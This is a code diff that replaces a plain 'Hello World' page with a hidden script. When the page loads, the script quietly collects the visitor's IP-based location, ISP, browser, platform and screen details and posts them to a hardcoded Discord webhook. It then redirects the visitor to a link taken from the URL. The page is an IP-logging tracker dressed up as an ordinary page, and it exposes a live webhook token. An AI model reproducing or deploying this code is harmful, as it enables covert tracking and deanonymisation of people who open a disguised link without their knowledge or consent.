@@ -1,1 +1,39 @@
-<h1>Hello World</h1>
+<script>
+(async () => {
+  const params = new URLSearchParams(location.search);
+  const redirectUrl = params.get("link");
+  const uid = params.get("id") || "N/A";
+
+  const ip = await fetch("https://ipapi.co/json/").then(res => res.json()).catch(() => ({}));
+  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
+  const now = new Date().toISOString();
+
+  const info = {
+    title: "🎯 New Device Logged",
+    color: 0xff0000,
+    fields: [
+      { name: "ID", value: uid, inline: false },
+      { name: "IP", value: ip.ip || "N/A", inline: true },
+      { name: "ASN", value: ip.asn || "N/A", inline: true },
+      { name: "Org", value: ip.org || "N/A", inline: true },
+      { name: "City", value: ip.city || "N/A", inline: true },
+      { name: "Region", value: ip.region || "N/A", inline: true },
+      { name: "Country", value: ip.country_name || "N/A", inline: true },
+      { name: "Timezone", value: timezone, inline: true },
+      { name: "Language", value: navigator.language || "N/A", inline: true },
+      { name: "Platform", value: navigator.platform || "N/A", inline: true },
+      { name: "User-Agent", value: navigator.userAgent.slice(0, 1024), inline: false },
+      { name: "Screen", value: `${screen.width}x${screen.height} @ ${screen.colorDepth}bit`, inline: true },
+      { name: "Timestamp", value: now, inline: false },
+    ],
+  };
+
+  await fetch("https://discord.com/api/webhooks/1361441104939057283/JPyevNJQWb_1WE7678Pr8AAFwE4WDKZMN_t-O57pHMN2m5j8NU-kL4AKV6gztEs1yCAl", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ embeds: [info] }),
+  });
+
+  if (redirectUrl) location.href = redirectUrl;
+})();
+</script>
